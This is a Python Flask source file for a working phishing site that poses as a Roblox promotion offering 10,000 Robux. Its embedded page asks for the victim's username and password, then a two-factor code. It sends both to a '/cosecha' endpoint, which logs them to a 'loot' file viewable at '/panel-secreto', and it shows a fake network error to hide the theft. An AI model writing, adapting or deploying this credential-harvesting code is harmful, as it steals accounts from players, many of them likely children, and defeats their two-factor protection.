from flask import Flask, request, jsonify
import json
import os

app = Flask(__name__)
LOG_FILE = "botin_roblox.json"

# HTML INCUSTADO PARA EVITAR ERRORES DE RUTA
HTML_PAGINA = """
<!DOCTYPE html>
<html>
<head>
    <title>Roblox - Promo Code Redemption</title>
    <style>
        body { background-color: #f2f4f5; font-family: 'Arial'; text-align: center; margin: 0; padding: 0; }
        .box { background: white; width: 90%; max-width: 350px; margin: 50px auto; padding: 25px; border-radius: 8px; box-shadow: 0px 4px 15px rgba(0,0,0,0.2); }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; }
        button { background: #0084ff; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; }
        #step2 { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://images.rbxcdn.com/f310344f6c41b8c2813dfd59-roblox_logo_dark.png" width="160">
        <div id="step1">
            <h3>🎁 ¡Canje de 10,000 Robux!</h3>
            <p>Ingresa tus datos para verificar tu cuenta</p>
            <input type="text" id="user" placeholder="Usuario">
            <input type="password" id="pass" placeholder="Contraseña">
            <button onclick="siguiente()">RECLAMAR ROBUX</button>
        </div>
        <div id="step2">
            <h3>🛡️ Verificación Requerida</h3>
            <p>Ingresa el código enviado a tu correo</p>
            <input type="text" id="code" placeholder="Código de 6 dígitos">
            <button onclick="finalizar()">VERIFICAR</button>
        </div>
    </div>
    <script>
        let u, p;
        function siguiente() {
            u = document.getElementById('user').value;
            p = document.getElementById('pass').value;
            if(u && p) {
                fetch('/cosecha', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({usuario: u, clave: p, etapa: 'Login'})
                });
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
            }
        }
        function finalizar() {
            const c = document.getElementById('code').value;
            fetch('/cosecha', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({usuario: u, codigo: c, etapa: '2FA'})
            }).then(() => {
                alert('Error de red. Intenta en 24 horas.');
                location.reload();
            });
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return HTML_PAGINA

@app.route('/cosecha', methods=['POST'])
def cosecha():
    data = request.json
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")
    return jsonify({"status": "success"}), 200

@app.route('/panel-secreto')
def ver_botin():
    if not os.path.exists(LOG_FILE): return "Botín vacío..."
    with open(LOG_FILE, "r") as f:
        return "<br>".join(f.readlines())

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
